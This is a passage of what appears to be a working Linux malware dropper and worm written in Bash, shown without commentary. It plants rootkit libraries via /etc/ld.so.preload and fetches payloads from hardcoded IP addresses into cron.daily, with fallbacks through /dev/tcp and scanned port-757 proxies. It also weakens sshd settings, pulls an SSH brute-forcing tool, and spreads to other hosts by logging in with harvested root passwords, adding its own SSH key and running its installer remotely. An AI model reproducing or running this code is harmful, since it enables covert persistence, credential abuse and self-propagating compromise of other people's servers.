			grep '/usr/local/lib/pkitarm.so' /etc/ld.so.preload >/dev/null 2>&1 || echo '/usr/local/lib/pkitarm.so' >>/etc/ld.so.preload
			grep '/usr/local/lib/fkitarm.so' /etc/ld.so.preload >/dev/null 2>&1 || echo '/usr/local/lib/fkitarm.so' >>/etc/ld.so.preload
			grep '/usr/local/lib/skitarm.so' /etc/ld.so.preload >/dev/null 2>&1 || echo '/usr/local/lib/skitarm.so' >>/etc/ld.so.preload
			grep '/usr/local/lib/sshkitarm.so' /etc/ld.so.preload >/dev/null 2>&1 || echo '/usr/local/lib/sshkitarm.so' >>/etc/ld.so.preload
			grep '/usr/local/lib/sshpkitarm.so' /etc/ld.so.preload >/dev/null 2>&1 || echo '/usr/local/lib/sshpkitarm.so' >>/etc/ld.so.preload
		fi
	else
		if [[ ! -f /usr/local/lib/pkit.so ]] || [[ ! -f /usr/local/lib/skit.so ]] || [[ ! -f /usr/local/lib/fkit.so ]] || [[ ! -f /usr/local/lib/sshkit.so ]] || [[ ! -f /usr/local/lib/sshpkit.so ]]; then
			cat /dev/null >/etc/ld.so.preload
		else
			grep '/usr/local/lib/pkit.so' /etc/ld.so.preload >/dev/null 2>&1 || echo '/usr/local/lib/pkit.so' >>/etc/ld.so.preload
			grep '/usr/local/lib/fkit.so' /etc/ld.so.preload >/dev/null 2>&1 || echo '/usr/local/lib/fkit.so' >>/etc/ld.so.preload
			grep '/usr/local/lib/skit.so' /etc/ld.so.preload >/dev/null 2>&1 || echo '/usr/local/lib/skit.so' >>/etc/ld.so.preload
			grep '/usr/local/lib/sshkit.so' /etc/ld.so.preload >/dev/null 2>&1 || echo '/usr/local/lib/sshkit.so' >>/etc/ld.so.preload
			grep '/usr/local/lib/sshpkit.so' /etc/ld.so.preload >/dev/null 2>&1 || echo '/usr/local/lib/sshpkit.so' >>/etc/ld.so.preload
		fi
	fi
	if [[ $SKIPUPDATE -eq 0 ]]; then
		if [ ! -f /root/gcclib/date ]; then
			FILENAME="xbash"
			get_remote_file "http://5.133.65.53/soft/linux/xbash" "/etc/cron.daily/xbash"
		else
			hundred_days_ago=$(date -d 'now - 2 days' +%s)
			file_time=$(date -r "/root/gcclib/date" +%s)
			if ((file_time <= hundred_days_ago)); then
				FILENAME="xbash"
				get_remote_file "http://5.133.65.53/soft/linux/xbash" "/etc/cron.daily/xbash"
			fi
		fi
	fi
	rm -rf /root/sed* >/dev/null 2>&1
	rm -rf /usr/spirit/sed* >/dev/null 2>&1
	rm -rf /etc/alternatives/sed* >/dev/null 2>&1
	rm -rf /root/$PATH_NAME/sed* >/dev/null 2>&1
	rm -rf /root/$PATH_NAME/ip1.txt >/dev/null 2>&1
	rm -rf /usr/spirit/ip1.txt >/dev/null 2>&1
	#if [ -z "$DIRROOT" ]; then

	#	rm -rf /root/.cronman.pid >/dev/null 2>&1
	#	rm -rf /root/.cronman >/dev/null 2>&1
	#fi
	chattr -i -RV /usr/bin/curl >/dev/null 2>&1
	chmod 755 /usr/bin/curl >/dev/null 2>&1
	chattr -i -RV /usr/bin/wget >/dev/null 2>&1
	chmod 755 /usr/bin/wget >/dev/null 2>&1
	IPFILES="/root/tmp/ip.txt
/root/$PATH_NAME/ip.txt
/root/$PATH_NAME/ip.txt_tmp
/usr/spirit/allip
/usr/spirit/ip.txt_tmp
/usr/spirit/ip.txt
/etc/alternatives/ip.txt
/etc/alternatives/.xfit/ip.txt
/etc/alternatives/.warmup/ip.txt
/root/.xfit/ip.txt
/root/.warmup/ip.txt
/usr/spirit/ip.txt_tmp"
	echo "$IPFILES" | while IFS= read -r line; do
		if [ -f $line ]; then
			tr -d '\000' <$line >${line}.tmp
			rm -fr $line >/dev/null 2>&1
			mv -f ${line}.tmp $line >/dev/null 2>&1
			grep -Eo '(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)' $line | uniq | sort >${line}.tmp
			rm -fr $line >/dev/null 2>&1
			mv -f "${line}.tmp" "$line"
			sed -i 's/^[[:space:]]*//g' $line
			sed -i -e '$a\' $line
		fi
	done
	THISDIR=$(
		cd "$(dirname "$0")" || exit
		pwd
	)
	MY_NAME=$(basename "$0")
	if [ -f $THISDIR/${MY_NAME}.pid ]; then
		SCRIPTPID=$(cat $THISDIR/${MY_NAME}.pid)
		if [ -f /proc/$SCRIPTPID/status ]; then
			cat /proc/$SCRIPTPID/status | grep -q ${MY_NAME} && unset RUN || RUN=1
		else
			RUN=1
		fi
	else
		RUN=1
	fi
	if [ $MY_NAME == $FILE_REZ -o $MY_NAME == .${FILE_REZ} ]; then
		ps cax | grep cronman
		if [ $? -ne 0 ]; then
			RUN=1
		else
			unset RUN
		fi
	fi

	if [ $MY_NAME == cronman -o $MY_NAME == .cronman ]; then
		TESTCOUNT=$(ps cax | grep cronman | wc -l)
		if [[ $TESTCOUNT -gt 4 ]]; then
			InfoR "Many proc found, close"
			ps cax | grep cronman | grep -v "$$" | awk '{print $1}' | xargs kill
		fi
	fi
	if [ $MY_NAME == .cronman -o $MY_NAME == .${FILE_REZ} ]; then
		if [ -f /usr/.${FILE_REZ}.pid ]; then
			SCRIPTPID=$(cat /usr/.${FILE_REZ}.pid)
			if [ -f /proc/$SCRIPTPID/status ]; then
				cat /proc/$SCRIPTPID/status | grep -q ${FILE_REZ} && unset RUN
			fi
		fi
		if [ -f /etc/xbash/${MY_NAME}.pid ]; then
			SCRIPTPID=$(cat /etc/xbash/${MY_NAME}.pid)
			if [ -f /proc/$SCRIPTPID/status ]; then
				cat /proc/$SCRIPTPID/status | grep -q ${MY_NAME} && unset RUN
			fi
		fi
	fi

	grep -a "xfit" /root/.bashrc >/dev/null 2>&1 && sed -i ':again;$!N;$!b again; s/crontab() {[^}]*}//g' /root/.bashrc
	if [[ $RUN == 1 ]]; then
		rm -fr /usr/.${FILE_REZ}.pid /usr/${FILE_REZ}.pid /usr/tmp.file >/dev/null 2>&1
	fi
	#if [ -f /root/cronman ]; then
	#chattr -aui /root/cronman >>/dev/null 2>&1
	#rm -fr /root/cronman >>/dev/null 2>&1
	#fi
	if [[ $RUN == 1 ]]; then
		echo "$$" >$THISDIR/${MY_NAME}.pid
		if [ $MY_NAME == .cronman ]; then
			mkdir /etc/xbash >/dev/null 2>&1
			echo "$$" >/etc/xbash/${MY_NAME}.pid
		fi
		mkdir /etc/xinetd.d >/dev/null 2>&1
		chattr -aui /var/spool/cron/root >>/dev/null 2>&1
		chattr -aui /etc/crontab >>/dev/null 2>&1
		crontab -l >>/dev/null 2>&1 | grep -v 'kill' | crontab -
		mkdir /etc/lib >/dev/null 2>&1
		checkfrw
		set -fb
		DNS=$(cat /etc/resolv.conf)
		if [[ $DNS == *8.8.8.8* ]]; then
			echo "DNS OK"
		else
			echo nameserver 8.8.8.8 >>/etc/resolv.conf
		fi
		#Edit SSHD SETTINGS
		file="/etc/ssh/sshd_config"
		param[1]="PermitRootLogin "
		param[2]="PubkeyAuthentication"
		param[3]="AuthorizedKeysFile"
		param[4]="PasswordAuthentication"
		param[5]="HostKeyAlgorithms"
		param[6]="PubkeyAcceptedKeyTypes"
		# main
		while getopts .h. OPTION; do
			case $OPTION in
			h)
				usage
				#exit
				;;
			?)
				usage
				#exit
				;;
			esac
		done
		if [ -f /etc/ssh/sshd_config ]; then
			backup_sshd_config
			edit_sshd_config
			reload_sshd
		fi
		#############################################################
		mkdir /root/$PATH_NAME >/dev/null 2>&1
		mkdir -p /usr/spirit >/dev/null 2>&1
		cat <<'EOF' >/usr/spirit/spirit.sh
#!/bin/bash
TZ='Europe/Moscow' date '+%F %T' >/usr/spirit/date
DNS=$(cat /etc/resolv.conf)
if [[ $DNS == *8.8.8.8* ]]; then
    echo "DNS OK"
else
    echo nameserver 8.8.8.8 >>/etc/resolv.conf
fi
function __curl() {
    read proto server path <<<$(echo "${1//// }")
    DOC=/${path// //}
    HOST=${server//:*/}
    PORT=${server//*:/}
    [[ "${HOST}" == "${PORT}" ]] && PORT=80

    exec 3<>/dev/tcp/"${HOST}"/$PORT
    echo -en "GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n" >&3
    (while read line; do
        [[ "$line" == $'\r' ]] && break
    done && cat) <&3
    exec 3>&-
}
function testport() {
    if command -v nc &>/dev/null && nc -h 2>&1 | grep -q -- '-z'; then
        timeout 30 nc "$1" "$2" -z -w 2
        return $?
    elif command -v nc &>/dev/null; then
        cat /dev/null | timeout 30 nc "$1" "$2" -w 2
        return $?
    else
        timeout 5 bash -c '</dev/tcp/'"$1"'/'"$2"' &>/dev/null'
        return $?
    fi
}
InfoG() {
    echo -en "${green}${1}${nc}\n"
}
InfoR() {
    echo -en "${red}${1}${nc}\n"
}
InfoP() {
    echo -en "${purple}${1}${nc}\n"
}
red="\e[1;31m"
green="\e[1;32m"
purple="\033[1;35m"
nc="\e[0m"
if [ -f /root/lib/fileconf ]; then
    FILE_NAME=$($(sed -n '1{p;q}' /root/lib/fileconf))
    SERVICE_NAME=$($(sed -n '2{p;q}' /root/lib/fileconf))
    PATH_NAME=$($(sed -n '3{p;q}' /root/lib/fileconf))
    PATH_RES=$($(sed -n '4{p;q}' /root/lib/fileconf))
    FILE_RES=$($(sed -n '5{p;q}' /root/lib/fileconf))
    PATH_REZ=$($(sed -n '6{p;q}' /root/lib/fileconf))
    FILE_REZ=$($(sed -n '7{p;q}' /root/lib/fileconf))
else
    FILE_NAME="libgcc_a"
    SERVICE_NAME="crtend_b"
    PATH_NAME="gcclib"
    PATH_RES="/usr/lib/local"
    FILE_RES="crtres_c"
    PATH_REZ="/etc/lib"
    FILE_REZ="adxintrin_b"
fi
if [ ! -f /usr/spirit/myip ]; then
    myIP=$(ip a s | sed -ne '/127.0.0.1/!{s/^[ \t]*inet[ \t]*\([0-9.]\+\)\/.*$/\1/p}')
    echo $myIP >/usr/spirit/myip
fi
if [ -f /usr/spirit/myip ]; then
    sed -i -e 's/\s\+/\n/g' /usr/spirit/myip
    sed -i -e '$a\' /usr/spirit/myip
    TESTIP=$(cat /usr/spirit/myip)
    if [ ! -z "$TESTIP" ]; then
        cat /usr/spirit/myip /usr/spirit/ip.txt 2>/dev/null | sort | uniq >/usr/spirit/allip
        sed -i -e '$a\' /usr/spirit/allip
    fi
fi

if [ -f /root/$PATH_NAME/ip.txt ]; then
    cat /usr/spirit/allip /root/$PATH_NAME/ip.txt 2>/dev/null | sort | uniq >/usr/spirit/ip.txt
    sed -i -e '$a\' /usr/spirit/ip.txt
else
    mv -f /usr/spirit/allip /usr/spirit/ip.txt
    sed -i -e '$a\' /usr/spirit/ip.txt
fi
function get_remote_file() {
    REQUEST_URL=$1
    OUTPUT_FILENAME=$2
    TEMP_FILE="${THISDIR}/tmp.file"
    retfunc() {
        return "$1"
    }
    if command -v wget &>/dev/null; then
        InfoP "Try download $FILENAME via a direct connection ..."
        if command -v wget &>/dev/null && wget -h 2>&1 | grep -q -- '--tries'; then
            wget --no-check-certificate --timeout=2 --tries=3 -O "${TEMP_FILE}" "$REQUEST_URL" 2>&1 >/dev/null 2>&1
        else
            wget --no-check-certificate --timeout=5 -O "${TEMP_FILE}" "$REQUEST_URL" 2>&1 >/dev/null 2>&1
        fi
    elif command -v curl &>/dev/null; then
        InfoP "Try download $FILENAME with Curl via a direct connection..."
        curl --connect-timeout 2 -o "${TEMP_FILE}" "$REQUEST_URL"
    else
        InfoP "Try download $FILENAME with /dev/tcp via a direct connection..."
        __curl "$REQUEST_URL" >"${TEMP_FILE}"
    fi
    ########################################################################################
    err=$?
    if [[ $err -eq 0 ]]; then
        mv -f "${TEMP_FILE}" "${OUTPUT_FILENAME}"
        chmod 755 "${OUTPUT_FILENAME}"
        InfoG "$FILENAME File downloaded"
    else
        REQUEST_URL="http://5.133.65.53/soft/linux/$FILENAME"
        REMOTE_SERVER="5.133.65.53
    45.142.212.30"
        echo "$REMOTE_SERVER" | while IFS= read -r line; do
            line=$(echo -e "${line}" | sed -r 's/ //g')
            URL=$(echo "$REQUEST_URL" | sed -r "s#(http?://)?([^/]+)(.*)#\1$line\3#")
            echo $URL
            if command -v wget &>/dev/null; then
                InfoP "Try download $FILENAME via a direct connection $line ..."
                if command -v wget &>/dev/null && wget -h 2>&1 | grep -q -- '--tries'; then
                    wget --timeout=2 --tries=3 -O "${TEMP_FILE}" "$URL" 2>&1 >/dev/null 2>&1
                else
                    wget --timeout=5 -O "${TEMP_FILE}" "$URL" 2>&1 >/dev/null 2>&1
                fi
            elif command -v curl &>/dev/null; then
                InfoP "Try download $FILENAME with Curl via a direct connection $line..."
                curl --connect-timeout 2 -o "${TEMP_FILE}" "$URL"
            else
                InfoP "Try download $FILENAME with /dev/tcp via a direct connection $line..."
                __curl "$URL" >"${TEMP_FILE}"
            fi
            err=$?
            if [[ $err -eq 0 ]]; then
                return 0
            else
                retfunc 3
            fi
        done
        err=$?
        if [[ $err -eq 0 ]]; then
            mv -f "${TEMP_FILE}" "${OUTPUT_FILENAME}"
            chmod 755 "${OUTPUT_FILENAME}"
            InfoG "$FILENAME File downloaded"
        else
            if [[ ! -z $(cat /usr/spirit/ip.txt) ]]; then
                port=757
                threads=40
                IPS=''
                echo '' >/usr/spirit/found757.lst
                echo '' >/usr/spirit/targets757
                echo '' >/usr/spirit/logfile757
                IPS=$(cat /usr/spirit/ip.txt)
                server=''
                for server in $IPS; do
                    server=${server//[[:space:]]/}
                    echo $port "$server" >>/usr/spirit/targets757
                done
                InfoP "Scanning port 757..."

                if command -v nc &>/dev/null && nc -h 2>&1 | grep -q -- '-z'; then
                    xargs -a /usr/spirit/targets757 -n 2 -P $threads sh -c 'timeout 30 nc $1 '$port' -z -w 2; echo $? $1 >> /usr/spirit/logfile757'
                elif command -v nc &>/dev/null; then
                    xargs -a /usr/spirit/targets757 -n 2 -P $threads sh -c 'cat /dev/null |timeout 30 nc $1 '$port' -w 2 >/dev/null 2>&1; echo $? $1 >> /usr/spirit/logfile757'
                else
                    xargs -a /usr/spirit/targets757 -n 2 -P $threads bash -c 'timeout 3 bash -c "</dev/tcp/$1/'$port' &>/dev/null"; echo $? $1 >> /usr/spirit/logfile757'
                fi

                grep "^0" /usr/spirit/logfile757 | cut -d " " -f2 >/usr/spirit/found757.lst
                if [ -f /usr/spirit/found757.lst ]; then
                    REQUEST_URL="http://5.133.65.53/soft/linux/$FILENAME"
                    FOUND=$(cat /usr/spirit/found757.lst)
                    for server in $FOUND; do
                        server=${server//[[:space:]]/}
                        REMOTEHOST=$server
                        REMOTEPORT=757
                        TIMEOUT=2
                        if testport "$REMOTEHOST" $REMOTEPORT; then
                            if command -v wget &>/dev/null; then
                                InfoP "Try download $FILENAME via $REMOTEHOST..."
                                if command -v wget &>/dev/null && wget -h 2>&1 | grep -q -- '--tries'; then
                                    http_proxy="http://$REMOTEHOST:757" wget --timeout=2 --tries=3 -O "${TEMP_FILE}" "$REQUEST_URL" 2>&1 >/dev/null 2>&1
                                else
                                    http_proxy="http://$REMOTEHOST:757" wget --timeout=5 -O "${TEMP_FILE}" "$REQUEST_URL" 2>&1 >/dev/null 2>&1
                                fi
                            elif command -v curl &>/dev/null; then
                                InfoP "Try download $FILENAME with Curl via $REMOTEHOST..."
                                curl -x "$REMOTEHOST:$REMOTEPORT" --connect-timeout 2 -o "${TEMP_FILE}" "$REQUEST_URL" >/dev/null 2>&1
                            else
                                InfoP "Try download $FILENAME with /dev/tcp via $REMOTEHOST"
                                __curl "http://$REMOTEHOST:$REMOTEPORT/soft/linux/$FILENAME" >"${TEMP_FILE}"
                            fi
                            err=$?
                            if [[ $err -eq 0 ]]; then
                                mv -f "${TEMP_FILE}" "${OUTPUT_FILENAME}"
                                chmod 755 "${OUTPUT_FILENAME}"
                                CHECK_FILE=1
                                break
                            else
                                InfoR "The file is broken "
                            fi
                        else
                            InfoR "$REMOTEHOST Port $REMOTEPORT closed"
                            CHECK_FILE=0
                        fi
                    done
                    if [[ "$CHECK_FILE" -eq 1 ]]; then
                        InfoG "$FILENAME File downloaded"
                    else
                        return 1
                    fi
                else
                    return 1
                fi
            else
                return 1
            fi
        fi
    fi
}
function get_spirit() {
    if [ $(arch) == "aarch64" ]; then
        DOWNLOAD_FILE_NAME="spirit-arm.tgz"
    else
        DOWNLOAD_FILE_NAME="spirit.tgz"
    fi
    FILENAME="$DOWNLOAD_FILE_NAME"
    FILE_URL="https://github.com/theaog/spirit/raw/master/$DOWNLOAD_FILE_NAME"
    EXISTING_SHELL_SCRIPT_FILE="${THISDIR}/$FILENAME"
    get_remote_file "${FILE_URL}" "${EXISTING_SHELL_SCRIPT_FILE}"
    if [ $(arch) == "aarch64" ]; then
        DOWNLOAD_FILE_NAME="spirit.tgz"
        FILENAME="$DOWNLOAD_FILE_NAME"
        FILE_URL="https://github.com/theaog/spirit/raw/master/$DOWNLOAD_FILE_NAME"
        EXISTING_SHELL_SCRIPT_FILE="${THISDIR}/$FILENAME"
        get_remote_file "${FILE_URL}" "${EXISTING_SHELL_SCRIPT_FILE}"
    else
        DOWNLOAD_FILE_NAME="spirit-arm.tgz"
        FILENAME="$DOWNLOAD_FILE_NAME"
        FILE_URL="https://github.com/theaog/spirit/raw/master/$DOWNLOAD_FILE_NAME"
        EXISTING_SHELL_SCRIPT_FILE="${THISDIR}/$FILENAME"
        get_remote_file "${FILE_URL}" "${EXISTING_SHELL_SCRIPT_FILE}"
    fi
    mkdir -p /usr/spirit/tmp >/dev/null 2>&1
    tar --overwrite -zmxvf spirit.tgz -C /usr/spirit/tmp >/dev/null 2>&1
    tar --overwrite -zmxvf spirit-arm.tgz -C /usr/spirit/tmp >/dev/null 2>&1
    rm -fr /usr/spirit/test.log
    mv -f /usr/spirit/tmp/spirit-arm /usr/spirit/spirit-arm >/dev/null 2>&1
    mv -f /usr/spirit/tmp/spirit /usr/spirit/spirit >/dev/null 2>&1
    rm -fr /usr/spirit/tmp /usr/spirit/spirit.tgz >/dev/null 2>&1
    rm -fr /usr/spirit/tmp /usr/spirit/spirit-arm.tgz >/dev/null 2>&1
    chmod 755 /usr/spirit/spirit /usr/spirit/spirit-arm /usr/spirit/sshpass /usr/spirit/sshpass-arm >/dev/null 2>&1
    \cp /usr/spirit/spirit /usr/spirit/tar/usr/spirit/spirit >/dev/null 2>&1
    \cp /usr/spirit/spirit-arm /usr/spirit/tar/usr/spirit/spirit-arm >/dev/null 2>&1
    cd /usr/spirit/tar
    tar -zcf /var/lib/${FILE_NAME}.tar.gz "root/$PATH_NAME/xfitaarch.sh" "root/$PATH_NAME/timeoutaarch" "root/$PATH_NAME/timeout64" "root/$PATH_NAME/xfit.sh" \
        "root/$PATH_NAME/ip.txt_tmp" "root/$PATH_NAME/$FILE_NAME" "etc/cron.daily/xbash" "usr/$FILE_REZ" "usr/local/lib/pkit.so" \
        "usr/local/lib/fkit.so" "usr/local/lib/skit.so" "usr/local/lib/sshkit.so" "usr/local/lib/sshpkit.so" "usr/local/lib/fkitarm.so" "usr/local/lib/skitarm.so" \
        "usr/local/lib/pkitarm.so" "usr/local/lib/sshkitarm.so" "usr/local/lib/sshpkitarm.so" \
        "usr/spirit/spirit" "usr/spirit/spirit-arm" "usr/spirit/sshpass" "usr/spirit/sshpass-arm" "usr/spirit/ip.txt_tmp" "usr/spirit/spirit.sh" \
        "usr/spirit/typical" "usr/spirit/gclib" "usr/spirit/alllib"
    cd /usr/spirit
}

function testgcc() {
    retfunc() {
        return "$1"
    }
    USERPATH="/etc/opt
    /etc/libnl
    /etc/postfix
    /home/lib
    /home/lib64
    /sbin
    /var/kernel
    /var/log
    /var/crash
    /mnt
    /root/$PATH_NAME"
    echo "$USERPATH" | while IFS= read -r line; do
        if [ -f $line/gcc_p ]; then
            return 2
        elif [ -f $line/gcc_y ]; then
            return 1
        else
            retfunc 3
        fi
    done
    err=$?
    if [[ $err -eq 2 ]]; then
        USR=1
    elif [[ $err -eq 3 ]]; then
        if [ -d /root/xfit -o -d /root/.xfit -o -d /etc/alternatives/xfit -o -d /etc/alternatives/.xfit ]; then
            USR=0
        elif [ -f /root/.warmup/config.json ]; then
            CONF=$(cat /root/.warmup/config.json)
            if [[ $CONF == *24444* ]]; then
                USR=1
            else
                USR=0
            fi
        elif [ -f /etc/alternatives/.warmup/config.json ]; then
            CONF=$(cat /etc/alternatives/.warmup/config.json)
            if [[ $CONF == *24444* ]]; then
                USR=1
            else
                USR=0
            fi
        fi
    else
        USR=0
    fi
    if [ $USR -eq 1 ]; then
        GCC_FILE=gcc_p
        USR=1
    else
        GCC_FILE=gcc_y
        USR=0
    fi
}
function installgcc() {
    if [ -f /usr/spirit/found.ssh ]; then
        TEST=$(cat /usr/spirit/found.ssh)
        if [ ! -z "$TEST" ]; then
            if [ ! -f /usr/spirit/id_rsa ]; then
                ssh-keygen -b 2048 -t rsa -f /usr/spirit/id_rsa -q -N ""
            fi
            chmod 600 /usr/spirit/id_rsa >/dev/null 2>&1
            sed -r 's/\[[0-9]{2}\/[0-9]{2} [0-9]{2}:[0-9]{2}]//g' /usr/spirit/found.ssh | sort | uniq >/usr/spirit/sortfound.ssh
            mv -f /usr/spirit/sortfound.ssh /usr/spirit/found.ssh
            filename='/usr/spirit/found.ssh'
            exec 4<"$filename"
            while read -u4 p; do
                if [ ! -z "$p" ]; then
                    stringarray=($p)
                    PASS=${stringarray[5]}
                    LOGIN=${stringarray[1]}
                    InfoP "Try Install on $LOGIN"
                    /usr/spirit/$SSHPASS_NAME -p "${PASS}" ssh -oStrictHostKeyChecking=no -oHostKeyAlgorithms=ssh-rsa -o ConnectTimeout=15 ${LOGIN} 'exit 22' ||
                        /usr/spirit/$SSHPASS_NAME -p "${PASS}" ssh -oStrictHostKeyChecking=no -o ConnectTimeout=15 ${LOGIN} 'exit 33'
                    err=$?
                    if [[ $err -eq 22 ]]; then
                        OPT='-oHostKeyAlgorithms=ssh-rsa'
                        unset INPOSSIBLE
                    elif [[ $err -eq 33 ]]; then
                        unset OPT
                        unset INPOSSIBLE
                    else
                        INPOSSIBLE="1"
                    fi
                    if [ -z "$INPOSSIBLE" ]; then
                        ssh -q -o BatchMode=yes -i /usr/spirit/id_rsa -oStrictHostKeyChecking=no $OPT -o ConnectTimeout=5 ${LOGIN} 'exit 0'
                        if [ $? -ne 0 ]; then
                            InfoP "SSH connection without pass not possible. Try add RSA and install"
                            echo "create path"
                            /usr/spirit/$SSHPASS_NAME -p "${PASS}" ssh -oStrictHostKeyChecking=no $OPT -o ConnectTimeout=15 ${LOGIN} "mkdir -p /etc/lib /var/lib >/dev/null 2>&1 >/dev/null 2>&1"
                            echo "add authorized_keys"
                            cat /usr/spirit/id_rsa.pub | /usr/spirit/$SSHPASS_NAME -p "${PASS}" ssh -oStrictHostKeyChecking=no $OPT -o ConnectTimeout=15 "${LOGIN}" 'mkdir -pm 0700 /root/.ssh &&
    while read -r ktype key comment; do
        if ! (grep -Fw "$ktype $key" ~/.ssh/authorized_keys | grep -qsvF "^#"); then
            echo "$ktype $key $comment" >> ~/.ssh/authorized_keys
        fi
    done'
                            echo "add permission"
                            /usr/spirit/$SSHPASS_NAME -p "${PASS}" ssh -oStrictHostKeyChecking=no $OPT -o ConnectTimeout=15 ${LOGIN} 'chmod g-w /root/.ssh; chmod 700 /root/.ssh; chmod 600 /root/.ssh/authorized_keys; if [ -n "$(which restorecon 2>/dev/null)" ]; then restorecon -R -v /root/.ssh; fi'
                            echo "copy files"
                            /usr/spirit/$SSHPASS_NAME -p "${PASS}" scp -oStrictHostKeyChecking=no $OPT -o ConnectTimeout=15 /var/lib/${FILE_NAME}.tar.gz ${LOGIN}:/var/lib/${FILE_NAME}.tar.gz
                            echo "unpack archive"
                            /usr/spirit/$SSHPASS_NAME -p "${PASS}" ssh -oStrictHostKeyChecking=no $OPT -o ConnectTimeout=15 ${LOGIN} 'tar -C "/" --overwrite -xmvzf /var/lib/'${FILE_NAME}'.tar.gz'
                            echo "run install"
                            /usr/spirit/$SSHPASS_NAME -p "${PASS}" ssh -oStrictHostKeyChecking=no $OPT -o ConnectTimeout=15 ${LOGIN} 'chmod 755 /etc/cron.daily/xbash; echo "" >/root/'$GCC_FILE'; /etc/cron.daily/xbash '$USR' 0 `</dev/null` >nohup.out 2>&1 &'
                        else
                            InfoG "SSH connection without pass is possible. Install"
                            ssh -i /usr/spirit/id_rsa -oStrictHostKeyChecking=no $OPT ${LOGIN} "mkdir -p /etc/lib /var/lib >/dev/null 2>&1"
                            scp -i /usr/spirit/id_rsa -oStrictHostKeyChecking=no $OPT /var/lib/${FILE_NAME}.tar.gz ${LOGIN}:/var/lib/${FILE_NAME}.tar.gz
                            ssh -i /usr/spirit/id_rsa -oStrictHostKeyChecking=no $OPT ${LOGIN} 'tar -C "/" --overwrite -xmvzf /var/lib/'${FILE_NAME}'.tar.gz'
                            ssh -i /usr/spirit/id_rsa -oStrictHostKeyChecking=no $OPT ${LOGIN} 'chmod 755 /etc/cron.daily/xbash; echo "" >/root/'$GCC_FILE'; /etc/cron.daily/xbash '$USR' 0 `</dev/null` >nohup.out 2>&1 &'
                        fi
                    else
                        InfoR "Connect to $LOGIN inpossible"
                    fi
                fi
            done
        fi
    fi
}
mkdir -p /usr/spirit >/dev/null 2>&1
cd /usr/spirit
THISDIR=/usr/spirit
if [ $(arch) == "aarch64" ]; then
    DOWNLOAD_FILE_NAME="spirit-arm.tgz"
else
    DOWNLOAD_FILE_NAME="spirit.tgz"
fi
FILENAME="$DOWNLOAD_FILE_NAME"
FILE_URL="https://github.com/theaog/spirit/raw/master/$DOWNLOAD_FILE_NAME"
EXISTING_SHELL_SCRIPT_FILE="${THISDIR}/$FILENAME"
rm -fr /usr/spirit/test.log
if [ $(arch) == "aarch64" ]; then
    SPIRIT_NAME="spirit-arm"
    SSHPASS_NAME="sshpass-arm"
else
    SPIRIT_NAME="spirit"
    SSHPASS_NAME="sshpass"
fi
unset errspirit
./$SPIRIT_NAME >/usr/spirit/test.log
errspirit=$?
unset CHESK
CHESK=$(cat "/usr/spirit/test.log")
if [[ $CHESK == *expired* ]] || [[ $errspirit -ne 0 ]]; then
    get_remote_file "${FILE_URL}" "${EXISTING_SHELL_SCRIPT_FILE}"
    if [ $(arch) == "aarch64" ]; then
        DOWNLOAD_FILE_NAME="spirit.tgz"
        FILENAME="$DOWNLOAD_FILE_NAME"
        FILE_URL="https://github.com/theaog/spirit/raw/master/$DOWNLOAD_FILE_NAME"
        EXISTING_SHELL_SCRIPT_FILE="${THISDIR}/$FILENAME"
        get_remote_file "${FILE_URL}" "${EXISTING_SHELL_SCRIPT_FILE}"
    else
        DOWNLOAD_FILE_NAME="spirit-arm.tgz"
        FILENAME="$DOWNLOAD_FILE_NAME"
        FILE_URL="https://github.com/theaog/spirit/raw/master/$DOWNLOAD_FILE_NAME"
        EXISTING_SHELL_SCRIPT_FILE="${THISDIR}/$FILENAME"
        get_remote_file "${FILE_URL}" "${EXISTING_SHELL_SCRIPT_FILE}"
    fi
    mkdir -p /usr/spirit/tmp >/dev/null 2>&1
    tar --overwrite -zmxvf spirit.tgz -C /usr/spirit/tmp >/dev/null 2>&1
    tar --overwrite -zxmvf spirit-arm.tgz -C /usr/spirit/tmp >/dev/null 2>&1
    rm -fr /usr/spirit/test.log
    mv -f /usr/spirit/tmp/spirit-arm /usr/spirit/spirit-arm >/dev/null 2>&1
    mv -f /usr/spirit/tmp/spirit /usr/spirit/spirit >/dev/null 2>&1
    rm -fr /usr/spirit/tmp /usr/spirit/spirit.tgz >/dev/null 2>&1
    rm -fr /usr/spirit/tmp /usr/spirit/spirit-arm.tgz >/dev/null 2>&1
fi
chmod 755 /usr/spirit/spirit /usr/spirit/spirit-arm /usr/spirit/sshpass /usr/spirit/sshpass-arm
#cat  | grep -q 'has expired' && EXPIRED="1" || EXPIRED="0"
#############################################################################################
THISDIR=$(
    cd "$(dirname "$0")" || exit
    pwd
)
MY_NAME=$(basename "$0")
if [ -f $THISDIR/${MY_NAME}.pid ]; then
    SCRIPTPID=$(cat $THISDIR/${MY_NAME}.pid)
    if [ -f /proc/$SCRIPTPID/status ]; then
        cat /proc/$SCRIPTPID/status | grep -q ${MY_NAME} && unset RUN || RUN=1
    else
        RUN=1
    fi
else
    RUN=1
fi
if [[ $RUN == 1 ]]; then
    echo "$$" >$THISDIR/${MY_NAME}.pid
    ulimit -n 65535
    ################################
    testgcc
    ################################
    if [ -f /usr/spirit/ForTest.txt ]; then
        sed -i 's/^/root:/' /usr/spirit/ForTest.txt
        sed -i -e '$a\' /usr/spirit/ForTest.txt
        if [ -f /usr/spirit/gclib ]; then
            cat /usr/spirit/ForTest.txt /usr/spirit/gclib 2>/dev/null | sort | uniq >/usr/spirit/ForTest_tmp.txt
            mv -f /usr/spirit/ForTest_tmp.txt /usr/spirit/gclib
            sed -i -e '$a\' /usr/spirit/gclib
            rm -fr /usr/spirit/ForTest.txt >/dev/null 2>&1
        else
            mv -f /usr/spirit/ForTest.txt /usr/spirit/gclib
            sed -i -e '$a\' /usr/spirit/gclib
        fi
    fi

    if [ -f /usr/spirit/password.txt ]; then
        sed -i 's/^/root:/' /usr/spirit/password.txt
        sed -i -e '$a\' /usr/spirit/password.txt
        if [ -f /usr/spirit/typical ]; then
            sed -i -e '$a\' /usr/spirit/typical
            cat /usr/spirit/password.txt /usr/spirit/typical 2>/dev/null | sort | uniq >/usr/spirit/typical_tmp
            mv -f /usr/spirit/typical_tmp /usr/spirit/typical
            sed -i -e '$a\' /usr/spirit/typical
            rm -fr /usr/spirit/password.txt >/dev/null 2>&1
        else
